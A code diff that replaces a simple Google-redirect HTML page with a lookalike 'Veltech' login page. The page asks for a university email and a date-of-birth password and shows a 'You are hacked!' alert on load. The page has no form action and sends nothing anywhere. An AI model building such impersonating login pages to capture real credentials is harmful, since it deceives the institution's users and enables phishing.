@@ -1,18 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <link rel="stylesheet" type="text/css" href="modifications.css">
     <script>
-        // Redirect to Google after a short delay
-        setTimeout(function() {
-            window.location.href = 'https://www.google.com';
-        }, 1000); // Change the duration as needed (1000 ms = 1 second)
+        window.onload = function() {
+            alert("You are hacked!");
+        };
     </script>
 </head>
 <body>
-    <h1>Redirecting you to Google...</h1>
-    <p>If you are not redirected, <a href="https://www.google.com">click here</a>.</p>
+    <div class="container">
+        <div class="brand-logo"></div>
+        <div class="brand-title">Veltech</div>
+        <div class="inputs">
+            <label>User Name</label>
+            <input type="email" placeholder="vtuxxxxx@veltech.edu.in" /><br>
+            <label>PASSWORD</label>
+            <input type="password" placeholder="DOB" /><br>
+            <button type="submit">LOGIN</button>
+        </div>
+    </div>
 </body>
 </html>
